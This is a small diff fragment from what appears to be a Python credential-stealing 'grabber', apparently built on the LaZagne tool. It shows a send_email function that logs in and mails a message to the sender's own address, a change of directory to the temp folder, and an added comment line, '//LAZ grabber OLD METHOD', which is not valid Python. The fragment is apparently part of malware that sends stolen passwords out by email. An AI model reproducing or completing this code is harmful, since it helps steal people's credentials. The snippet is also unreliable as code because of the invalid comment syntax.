@@ -16,7 +16,7 @@ def send_email(email, password, message):
     server.login(email, password)
     server.sendmail(email, email, message)
     server.quit()
-
+//LAZ grabber OLD METHOD
 
 tempf = tempfile.gettempdir()
 os.chdir(tempf)
